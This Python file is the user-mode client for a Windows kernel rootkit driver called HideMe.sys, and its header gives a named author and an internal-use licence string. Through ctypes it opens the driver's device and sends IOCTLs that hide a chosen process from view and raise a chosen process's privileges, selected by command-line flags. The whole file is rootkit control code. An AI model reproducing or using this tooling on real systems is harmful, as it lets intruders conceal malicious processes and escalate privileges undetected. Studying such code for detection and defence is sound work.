from ctypes import *
import sys, os, argparse

__author__    =   "Christophe Alladoum"
__version__   =   "0.1"
__licence__   =   "Sophos, Inc. - Internal Use Only - Distribution Prohibited"
__file__      =   "HideMe.py"
__desc__      =   """Client for HideMe.sys kernel rootkit"""
__usage__     =   """
{3} version {0}, {1}
by {2}
syntax: {3} [options] args
""".format(__version__, __licence__, __author__, __file__)




ntdll = windll.ntdll
kernel32 = windll.kernel32

GENERIC_READ  = 0x80000000
GENERIC_WRITE = 0x40000000
OPEN_EXISTING = 0x03


def KdPrint(message):
    print(message)
    kernel32.OutputDebugStringA(message + '\n')
    return


def GenericIoctl(IoctlCode, InputData, InputDataLen):
    dwBytesReturned = c_uint32(0)
    hDriver = kernel32.CreateFileA(r'''\\.\HMRT''', GENERIC_READ | GENERIC_WRITE, 0, None, OPEN_EXISTING, 0, None)
    if hDriver == -1:
        raise ctypes.WinError()
    KdPrint(r'Opened handle to device \\.\HMRT')
    kernel32.DeviceIoControl(hDriver, IoctlCode, InputData, InputDataLen, None, 0, byref(dwBytesReturned), None)
    KdPrint("Sent Ioctl (%#x)" % (IoctlCode, ))
    kernel32.CloseHandle(hDriver)
    return dwBytesReturned


def HideProcess(pid):
    dwPid = c_uint32(pid)
    return  GenericIoctl(0x222004, byref(dwPid), sizeof(dwPid))


def ElevateProcess(pid):
    IoctlCode = 0x222014
    dwPid = c_uint32(pid)
    return GenericIoctl(IoctlCode, byref(dwPid), sizeof(dwPid))


if __name__ == "__main__":
    parser = argparse.ArgumentParser(usage = __usage__,
                                    description = __desc__)

    parser.add_argument("-v", "--verbose", default=False,
                        action="store_true", dest="verbose",
                        help="increments verbosity")

    parser.add_argument("--hide-pid", type=int, dest="hide_pid",
						help="PID of a process to hide")

    parser.add_argument("--elevate-pid", type=int, dest="elevate_pid",
						help="PID of a process to elevate")

    args = parser.parse_args()

    if args.hide_pid:
        HideProcess( args.hide_pid) 

    if args.elevate_pid:
        ElevateProcess( args.elevate_pid) 